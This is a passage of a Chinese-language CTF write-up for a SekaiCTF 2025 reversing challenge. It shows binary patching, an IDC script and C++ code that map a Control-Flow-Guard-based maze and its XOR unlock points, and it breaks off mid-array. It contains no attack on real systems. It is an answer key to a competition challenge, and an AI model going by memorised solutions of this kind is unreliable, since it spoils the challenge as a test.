text"></p><p>断点该处控制流保护Call，调试发现正常的一些函数就会经过上两个<code>jmp rax</code>跳转到对应函数，部分函数则不符合条件，会到最底下的<code>jmp</code>，然后触发异常。</p><p><img src="/2025/08/19/SekaiCTF2025/image-4.png" alt="alt text"></p><p>这边直接使用Patch代码，遍历所有函数，输出可执行的函数下标。</p><p>Call的部分代码直接该成，使用r15来遍历441个函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:00007FF7290F4890 loc_7FF7290F4890:</span><br><span class="line">.text:00007FF7290F4890 xor     r15, r15</span><br><span class="line">.text:00007FF7290F4893 loc_7FF7290F4893:</span><br><span class="line">.text:00007FF7290F4893 mov     rbx, r15</span><br><span class="line">.text:00007FF7290F4896 mov     rax, rva off_7FF729163040[r12+rbx*8]</span><br><span class="line">.text:00007FF7290F489E call    cs:__guard_xfg_dispatch_icall_fptr</span><br><span class="line">.text:00007FF7290F48A4 inc     r15</span><br><span class="line">.text:00007FF7290F48A7 cmp     r15, 1BAh</span><br><span class="line">.text:00007FF7290F48AE nop</span><br><span class="line">.text:00007FF7290F48AF jle     short loc_7FF7290F4893  </span><br></pre></td></tr></table></figure><p>然后顶上r12赋值的地方之后直接jmp到这段代码头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00007FF7290F4839 lea     r12, unk_7FF7290F0000</span><br><span class="line">.text:00007FF7290F4840 jmp     short loc_7FF7290F4890   </span><br></pre></td></tr></table></figure><p>调试运行，在Call内部将最底下<code>jmp</code>改成<code>ret</code>，然后给两个<code>jmp rax</code>设置条件断点输出r15。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto r15 = GetRegValue(&quot;r15&quot;);</span><br><span class="line">msg(&quot;%d,&quot;,r15);</span><br></pre></td></tr></table></figure><p>运行输出结果，以下就是可以Call的函数下标。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">22,24,25,26,28,29,30,31,32,33,34,35,36,37,38,39,40,43,47,55,57,59,61,64,65,66,67,68,69,70,71,72,74,75,76,78,80,82,87,93,97,99,106,107,108,110,112,114,115,116,117,118,120,121,122,123,124,131,133,139,143,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,164,165,166,169,179,187,190,192,194,196,197,198,199,200,201,202,204,206,208,213,215,217,219,223,225,227,229,232,234,235,236,237,238,240,241,242,244,246,247,248,249,250,253,259,267,271,274,275,276,277,278,279,280,281,282,283,284,285,286,288,290,291,292,295,299,301,303,305,307,309,311,313,316,318,319,320,322,324,326,328,330,332,334,339,341,345,349,351,355,358,359,360,362,364,365,366,367,368,370,372,373,374,376,379,381,383,387,393,395,397,400,402,404,405,406,408,409,410,412,413,414,416,418,</span><br></pre></td></tr></table></figure><p>上面得知该地图是21*21，而且这边可以看出可以Call的函数下标第一个刚好是v7初始值22，最后418刚好是代码最后对v7的校验值。</p><p>所以可以知道上面下标就是地图可走路的下标，而其他的则是墙壁，所以Call对应墙壁的函数才会触发异常，是利用控制流保护函数名单来做的校验。</p><p>使用代码输出该地图，可以看到确实是标准的一个地图，起点22，终点418。</p><p><img src="/2025/08/19/SekaiCTF2025/image-6.png" alt="alt text"></p><p>然而从地图看，通路仅有一条，并且路程就44步，不符合题目要求输入的50长度字符串要求的200步，且在运行的时候发现有些Call还是会异常。</p><p>可以在异常的函数中发现这边有个int，而其他正常函数是没有的，查看这段代码交叉调用，可以看到有另一个函数对他这边做了xor处理。</p><p>实际调试发现只要先调用了底下这个Call对上面的做xor处理，上面的函数就可以正常调用。</p><p><img src="/2025/08/19/SekaiCTF2025/image-8.png" alt="alt text"></p><p><img src="/2025/08/19/SekaiCTF2025/image-7.png" alt="alt text"></p><p>使用IDC脚本遍历出所有带的Xor函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;idc.idc&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> seg;</span><br><span class="line">    <span class="comment">// 遍历所有段</span></span><br><span class="line">    <span class="keyword">for</span> (seg = <span class="built_in">get_first_seg</span>(); seg != BADADDR; seg = <span class="built_in">get_next_seg</span>(seg))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 获取段名称</span></span><br><span class="line">        <span class="keyword">auto</span> seg_name = <span class="built_in">get_segm_name</span>(seg);</span><br><span class="line">        <span class="built_in">msg</span>(seg_name + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (seg_name == <span class="string">&quot;.text&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 从当前段头地址开始遍历</span></span><br><span class="line">            <span class="keyword">auto</span> current_addr = seg;</span><br><span class="line">            <span class="comment">// 结束地址</span></span><br><span class="line">            <span class="keyword">auto</span> end_addr = current_addr + <span class="number">0x140004730</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 遍历所有函数</span></span><br><span class="line">            <span class="keyword">auto</span> cur_func = seg;</span><br><span class="line">            <span class="keyword">auto</span> seg_end = <span class="built_in">get_segm_end</span>(seg);</span><br><span class="line">            <span class="keyword">while</span> (current_addr != BADADDR &amp;&amp; current_addr &lt; <span class="number">0x140004730</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">auto</span> insn_name = <span class="built_in">print_insn_mnem</span>(current_addr);</span><br><span class="line">                <span class="comment">// 获取操作数1</span></span><br><span class="line">                <span class="keyword">auto</span> op = <span class="built_in">print_operand</span>(current_addr, <span class="number">0</span>);</span><br><span class="line">                <span class="comment">// 获取操作数2</span></span><br><span class="line">                <span class="keyword">auto</span> op2 = <span class="built_in">print_operand</span>(current_addr, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (insn_name == <span class="string">&quot;xor&quot;</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">auto</span> func_name = <span class="built_in">get_func_name</span>(cur_func);</span><br><span class="line">                    <span class="built_in">msg</span>(func_name + <span class="string">&quot; %X :&quot;</span> + insn_name + <span class="string">&quot; &quot;</span> + op + <span class="string">&quot; &quot;</span> + op2 + <span class="string">&quot;\n&quot;</span>, current_addr);</span><br><span class="line">                &#125;</span><br><span class="line">                current_addr = <span class="built_in">next_head</span>(current_addr, end_addr);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以整理出以下对应Xor以及被Xor函数的表。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&#123;<span class="number">0x14000157E</span>, <span class="number">0x1400014F0</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x14000297E</span>, <span class="number">0x1400023D0</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x14000365E</span>, <span class="number">0x140001410</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x140003F3E</span>, <span class="number">0x140002710</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x14000421E</span>, <span class="number">0x140002110</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x14000443E</span>, <span class="number">0x140001790</span>&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>使用代码绘制出这8个函数下标处在地图上，然后大写字母对应Xor函数，小写字母对应被Xor函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD64 functionList[<span class="number">441</span>] = </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//... 自行导出</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> Road[]&#123;<span class="number">22</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">34</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">37</span>, <span class="number">38</span>, <span class="number">39</span>, <span class="number">40</span>, <span class="number">43</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">57</span>, <span class="number">59</span>, <span class="number">61</span>, <span class="number">64</span>, <span class="number">65</span>, <span class="number">66</span>, <span class="number">67</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">70</span>, <span class="number">71</span>, <span class="number">72</span>, <span class="number">74</span>, <span class="number">75</span>, <span class="number">76</span>, <span class="number">78</span>, <span class="number">80</span>, <span class="number">82</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">97</span>, <span class="number">99</span>, <span class="number">106</span>, <span class="number">107</span>, <span class="number">108</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">117</span>, <span class="number">118</span>, <span class="number">120</span>, <span class="number">121</span>, <span class="number">122</span>, <span class="number">123</span>, <span class="number">124</span>, <span class="number">131</span>, <span class="number">133</span>, <span class="number">139</span>, <span class="number">143</span>, <span class="number">148</span>, <span class="number">149</span>, <span class="number">150</span>, <span class="number">151</span>, <span class="number">152</span>, <span class="number">153</span>, <span class="number">154</span>, <span class="number">155</span>, <span class="number">156</span>, <span class="number">157</span>, <span class="number">158</span>, <span class="number">159</span>, <span class="number">160</span>, <span class="number">161</span>, <span class="number">162</span>, <span class="number">164</span>, <span class="number">165</span>, <span class="number">166</span>, <span class="number">169</span>, <span class="number">179</span>, <span class="number">187</span>, <span class="number">190</span>, <span class="number">192</span>, <span class="number">194</span>, <span class="number">196</span>, <span class="number">197</span>, <span class="number">198</span>, <span class="number">199</span>, <span class="number">200</span>, <span class="number">201</span>, <span class="number">202</span>, <span class="number">204</span>, <span class="number">206</span>, <span class="number">208</span>, <span class="number">213</span>, <span class="number">215</span>, <span class="number">217</span>, <span class="number">219</span>, <span class="number">223</span>, <span class="number">225</span>, <span class="number">227</span>, <span class="number">229</span>, <span class="number">232</span>, <span class="number">234</span>, <span class="number">235</span>, <span class="number">236</span>, <span class="number">237</span>, <span class="number">238</span>, <span class="number">240</span>, <span class="number">241</span>, <span class="number">242</span>, <span class="number">244</span>, <span class="number">246</span>, <span class="number">247</span>, <span class="number">248</span>, <span class="number">249</span>, <span class="number">250</span>, <span class="number">253</span>, <span class="number">259</span>, <span class="number">267</span>, <span class="number">271</span>, <span class="number">274</span>, <span class="number">275</span>, <span class="number">276</span>, <span class="number">277</span>, <span class="number">278</span>, <span class="number">279</span>, <span class="number">280</span>, <span class="number">281</span>, <span class="number">282</span>, <span class="number">283</span>, <span class="number">284</span>, <span class="number">285</span>, <span class="number">286</span>, <span class="number">288</span>, <span class="number">290</span>, <span class="number">291</span>, <span class="number">292</span>, <span class="number">295</span>, <span class="number">299</span>, <span class="number">301</span>, <span class="number">303</span>, <span class="number">305</span>, <span class="number">307</span>, <span class="number">309</span>, <span class="number">311</span>, <span class="number">313</span>, <span class="number">316</span>, <span class="number">318</span>, <span class="number">319</span>, <span class="number">320</span>, <span class="number">322</span>, <span class="number">324</span>, <span class="number">326</span>, <span class="number">328</span>, <span class="number">330</span>, <span class="number">332</span>, <span class="number">334</span>, <span class="number">339</span>, <span class="number">341</span>, <span class="number">345</span>, <span class="number">349</span>, <span class="number">351</span>, <span class="number">355</span>, <span class="number">358</span>, <span class="number">359</span>, <span class="number">360</span>, <span class="number">362</span>, <span class="number">364</span>, <span class="number">365</span>, <span class="number">366</span>, <span class="number">367</span>, <span class="number">368</span>, <span class="number">370</span>, <span class="number">372</span>, <span class="number">373</span>, <span class="number">374</span>, <span class="number">376</span>, <span class="number">379</span>, <span class="number">381</span>, <span class="number">383</span>, <span class="number">387</span>, <span class="number">393</span>, <span class="number">395</span>, <span class="number">397</span>, <span class="number">400</span>, <span class="number">402</span>, <span class="number">404</span>, <span class="number">405</span>, <span class="number">406</span>, <span class="number">408</span>, <span class="number">409</span>, <span class="number">410</span>, <span class="number">412</span>, <span class="number">413</span>, <span class="number">414</span>, <span class="number">416</span>, <span class="number">418</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> XorList[] =</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0x09</span>, <span class="number">0x40</span>, <span class="number">0x11</span>, <span class="number">0xE4</span>, <span class="number">0x1C</span>, <span class="number">0x81</span>, <span class="number">0x92</span>, <span class="number">0xDB</span>, <span class="number">0x0B</span>, <span class="number">0x75</span>,</span><br><span class="line">            <span class="number">0x26</span>, <span class="number">0x6A</span>, <span class="number">0x2F</span>, <span class="number">0x7F</span>, <span class="number">0xDD</span>, <span class="number">0xD2</span>, <span class="number">0x52</span>, <span class="number">0x21</span>, <span class="number">0x76</span>, <span class="number">0x9F</span>,</span><br><span class="line">            <span class="number">0xDF</span>, <span class="number">0x8E</span>, <span class="number">0x8F</span>, <span class="number">0xCD</span>, <span class="number">0x9F</span>, <span class="number">0x84</span>, <span class="number">0x61</span>, <span class="number">0x3F</span>, <span class="number">0x6D</span>, <span class="number">0x7A</span>,</span><br><span class="line">            <span class="number">0x87</span>, <span class="number">0x1E</span>, <span class="number">0x21</span>, <span class="number">0x99</span>, <span class="number">0xC7</span>, <span class="number">0x65</span>, <span class="number">0xDC</span>, <span class="number">0xC8</span>, <span class="number">0x4A</span>, <span class="number">0x22</span>,</span><br><span class="line">            <span class="number">0x7D</span>, <span class="number">0x28</span>, <span class="number">0x64</span>, <span class="number">0x69</span>, <span class="number">0xDC</span>, <span class="number">0x20</span>, <span class="number">0x34</span>, <span class="number">0xED</span>, <span class="number">0xFB</span>, <span class="number">0xD7</span>&#125;;</span><br><span class="line"></span><br><span class="line">    DWORD64 SpecialPointMap[][<span class="number">2</span>]&#123;&#123;<span class="number">0x14000157E</span>, <span class="number">0x1400014F0</span>&#125;,</span><br><span class="line">                                 &#123;<span class="number">0x14000297E</span>, <span class="number">0x1400023D0</span>&#125;,</span><br><span class="line">                                 &#123;<span class="number">0x14000365E</span>, <span class="number">0x140001410</span>&#125;,</span><br><span class="line">                                 &#123;<span class="number">0x140003F3E</span>, <span class="number">0x140002710</span>&#125;,</span><br><span class="line">                                 &#123;<span class="number">0x14000421E</span>, <span class="number">0x140002110</span>&#125;,</span><br><span class="line">                                 &#123;<span class="number">0x14000443E</span>, <span class="number">0x140001790</span>&#125;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> SpecialPointIndexMap[<span class="number">6</span>][<span class="number">2</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> CurrentP1 = SpecialPointMap[i][<span class="number">0</span>] - <span class="number">14</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">auto</span> CurrentP2 = SpecialPointMap[i][<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> index1&#123;&#125;, index2&#123;&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">441</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (functionList[j] == CurrentP1)</span><br><span class="line">            &#123;</span><br><span class="line">                index1 = j;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (functionList[j] == CurrentP2)</span><br><span class="line">            &#123;</span><br><span class="line">                index2 = j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        SpecialPointIndexMap[i][<span class="number">0</span>] = index1;</span><br><span class="line">        SpecialPointIndexMap[i][<span class="number">1</span>] = index2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> MazeMap[<span class="number">21</span> * <span class="number">21</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> StartPos = <span class="number">22</span>, EndPos = <span class="number">418</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> Pos = <span class="number">22</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">21</span> * <span class="number">21</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        MazeMap[i] = <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">199</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        MazeMap[Road[i]] = <span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    MazeMap[StartPos] = <span class="string">&#x27;S&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    MazeMap[EndPos] = <span class="string">&#x27;E&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> index1 = SpecialPointIndexMap[i][<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">auto</span> index2 = SpecialPointIndexMap[i][<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        MazeMap[index1] = <span class="string">&#x27;A&#x27;</span> + i;</span><br><span class="line">        MazeMap[index2] = <span class="string">&#x27;a&#x27;</span> + i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">21</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">21</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>, MazeMap[i * <span class="number">21</span> + j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到以下地图，看地图就可以知道Xor的意义，也就是得先走到Xor函数位置，触发函数对小写字母处的函数进行Xor，也就是所谓的“解锁”，让小写字母位置函数可以Call，也就是可以通过。</p><p>综上需要走到大写字母处去解锁对应小写字母处位置，才能通过那格。</p><p><img src="/2025/08/19/SekaiCTF2025/image-10.png" alt="alt text"></p><p>我是直接写了个交互程序，自己按最短路走了一遍迷宫，发现刚好是200步，就可以将路径数据转为输入字节异或后的数据，再异或即可得到Flag。</p><p>交互代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Map function list</span></span><br><span class="line">DWORD64 functionList[] = </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//... 自行导出</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// SafeRoad</span></span><br><span class="line">    <span class="type">int</span> Road[]&#123;<span class="number">22</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">34</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">37</span>, <span class="number">38</span>, <span class="number">39</span>, <span class="number">40</span>, <span class="number">43</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">57</span>, <span class="number">59</span>, <span class="number">61</span>, <span class="number">64</span>, <span class="number">65</span>, <span class="number">66</span>, <span class="number">67</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">70</span>, <span class="number">71</span>, <span class="number">72</span>, <span class="number">74</span>, <span class="number">75</span>, <span class="number">76</span>, <span class="number">78</span>, <span class="number">80</span>, <span class="number">82</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">97</span>, <span class="number">99</span>, <span class="number">106</span>, <span class="number">107</span>, <span class="number">108</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">117</span>, <span class="number">118</span>, <span class="number">120</span>, <span class="number">121</span>, <span class="number">122</span>, <span class="number">123</span>, <span class="number">124</span>, <span class="number">131</span>, <span class="number">133</span>, <span class="number">139</span>, <span class="number">143</span>, <span class="number">148</span>, <span class="number">149</span>, <span class="number">150</span>, <span class="number">151</span>, <span class="number">152</span>, <span class="number">153</span>, <span class="number">154</span>, <span class="number">155</span>, <span class="number">156</span>, <span class="number">157</span>, <span class="number">158</span>, <span class="number">159</span>, <span class="number">160</span>, <span class="number">161</span>, <span class="number">162</span>, <span class="number">164</span>, <span class="number">165</span>, <span class="number">166</span>, <span class="number">169</span>, <span class="number">179</span>, <span class="number">187</span>, <span class="number">190</span>, <span class="number">192</span>, <span class="number">194</span>, <span class="number">196</span>, <span class="number">197</span>, <span class="number">198</span>, <span class="number">199</span>, <span class="number">200</span>, <span class="number">201</span>, <span class="number">202</span>, <span class="number">204</span>, <span class="number">206</span>, <span class="number">208</span>, <span class="number">213</span>, <span class="number">215</span>, <span class="number">217</span>, <span class="number">219</span>, <span class="number">223</span>, <span class="number">225</span>, <span class="number">227</span>, <span 